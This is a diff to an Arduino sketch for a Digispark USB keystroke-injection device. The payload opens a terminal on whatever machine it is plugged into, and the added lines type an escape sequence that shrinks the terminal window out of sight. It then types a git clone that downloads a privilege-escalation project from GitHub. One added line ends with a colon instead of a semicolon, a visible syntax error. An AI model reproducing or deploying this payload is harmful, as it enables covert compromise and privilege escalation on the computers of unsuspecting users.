@@ -4,6 +4,8 @@ void setup() {
     DigiKeyboard.delay(500);
     DigiKeyboard.sendKeyStroke(KEY_T,MOD_CONTROL_LEFT|MOD_ALT_LEFT);
     DigiKeyboard.delay(1000);
+    DigiKeyboard.print("printf '\e[8;10;10t'");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER):
     DigiKeyboard.print("git clone https://github.com/Jidnyesh/Final-Project-Priv-Escalation.git");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(2000);
